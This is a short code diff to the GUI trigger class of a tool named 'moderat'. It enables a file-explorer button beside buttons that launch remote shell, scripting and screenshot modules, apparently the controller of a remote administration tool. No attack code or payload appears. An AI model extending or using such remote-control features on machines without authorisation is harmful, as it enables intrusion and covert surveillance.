@@ -20,7 +20,7 @@ class mainTriggers:
         self.moderat.setAliasButton.clicked.connect(self.moderat.set_alias)
         # self.moderat.updateSourceButton.clicked.connect(self.update_source)
         self.moderat.shellButton.clicked.connect(lambda: self.moderat.execute_module(module='shell'))
-        # self.moderat.explorerButton.clicked.connect(lambda: self.execute_module(module='explorer'))
+        self.moderat.explorerButton.clicked.connect(lambda: self.moderat.execute_module(module='explorer'))
         # self.moderat.proccessesButton.clicked.connect(lambda: self.execute_module(module='processes'))
         self.moderat.scriptingButton.clicked.connect(lambda: self.moderat.execute_module(module='scripting'))
         self.moderat.screenshotButton.clicked.connect(lambda: self.moderat.execute_module(module='desktop'))
